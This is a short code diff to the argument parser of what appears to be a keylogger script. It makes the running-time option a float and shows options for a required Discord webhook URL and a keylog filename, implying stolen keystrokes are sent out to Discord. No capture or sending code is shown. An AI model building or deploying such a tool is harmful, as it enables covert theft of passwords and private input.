@@ -3,7 +3,7 @@ from datetime import datetime, timedelta
 def main():
     parser = argparse.ArgumentParser(description="Let me copy the keyboard")
     parser.add_argument("-a", help="Your Discord webhook URL. \nThis is required!", required=True)
-    parser.add_argument("-t", help="The running time in minutes. \n The default time is set to 15.", default=0.1)
+    parser.add_argument("-t", help="The running time in minutes. \n The default time is set to 15.", default=0.1, type=float)
     parser.add_argument("-n", help="Filename of the keylog. \nFilename must end in .txt! \nThe default name is set to keylog.txt.", default="keylog.txt", type=validate_filename)
     parser.add_argument("-d", help="Display time in keylog file.")
     args = parser.parse_args()
